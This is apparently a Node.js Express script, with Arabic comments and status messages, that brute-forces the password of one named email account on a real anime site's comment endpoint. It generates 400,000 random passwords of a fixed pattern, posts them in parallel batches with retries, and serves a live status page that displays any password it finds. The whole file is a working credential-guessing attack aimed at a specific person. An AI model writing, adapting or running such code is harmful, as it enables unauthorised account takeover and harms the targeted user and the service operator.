const express = require("express");
const app = express();
const axios = require("axios");

const targetEmail = "abrheem16@gmail.com";
const animeId = "532";
const commentText = "TEST";

let foundPassword = null;
let finished = false;
let currentTries = [];
let allPasswords = [];
let currentIndex = 0;
const parallelLimit = 10;

async function tryPassword(password, retries = 3) {
  try {
    const response = await axios.post(
      "https://app.sanime.net/function/h10.php?page=addcmd",
      new URLSearchParams({
        email: targetEmail,
        password: password,
        item: JSON.stringify({ post: commentText, id: animeId, fire: false }),
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent":
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
          Connection: "keep-alive",
        },
        timeout: 8000,
      }
    );

    const body = response.data;
    if (body && typeof body === "object" && body.status === 1) {
      foundPassword = password;
      finished = true;
      console.log(`✅ Found password: ${password}`);
    }
  } catch (err) {
    if (retries > 0 && !foundPassword && !finished) {
      console.log(`⚠️ خطأ مع الباسورد ${password}... إعادة المحاولة`);
      await tryPassword(password, retries - 1);
    }
  }
}

async function bruteForceStart() {
  while (!finished && currentIndex < allPasswords.length) {
    const batch = allPasswords.slice(currentIndex, currentIndex + parallelLimit);
    currentTries = batch;
    await Promise.all(batch.map((pwd) => tryPassword(pwd)));
    currentIndex += parallelLimit;
  }

  if (!foundPassword) finished = true;
}

app.get("/", (req, res) => {
  const html = `
    <html>
      <head>
        <meta http-equiv="refresh" content="5">
        <title>Brute Status</title>
      </head>
      <body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px">
        <h1>🔐 كلمة المرور:</h1>
        ${
          foundPassword
            ? `<h2 style="color:#0f0">${foundPassword}</h2>`
            : finished
            ? `<h2 style="color:orange">❌ تم الانتهاء من جميع الباسوردات ولم يتم العثور على الباسورد الصحيح</h2>`
            : `<h2>جارٍ البحث... 🌀</h2><h3>تجريب: ${currentTries.join(" , ")}</h3>`
        }
        <p style="color:#888">📡 الرابط: https://noon-9v11.onrender.com/</p>
      </body>
    </html>`;
  res.send(html);
});

// توليد كلمات مرور عشوائية بناءً على النمط الذي حددته
function generatePasswords(count) {
  const charset = "abcdefghijklmnopqrstuvwxyz";
  const upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const digits = "0123456789";
  const list = [];

  while (list.length < count) {
    let pass = "";
    pass += upper[Math.floor(Math.random() * upper.length)];
    for (let i = 0; i < 5; i++) {
      pass += charset[Math.floor(Math.random() * charset.length)];
    }
    let d1 = digits[Math.floor(Math.random() * digits.length)];
    let d2 = digits[Math.floor(Math.random() * digits.length)];
    pass += d1 + d2;
    list.push(pass);
  }
  return list;
}

// إنشاء 400,000 كلمة مرور عشوائية
allPasswords = generatePasswords(400000);
bruteForceStart();

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
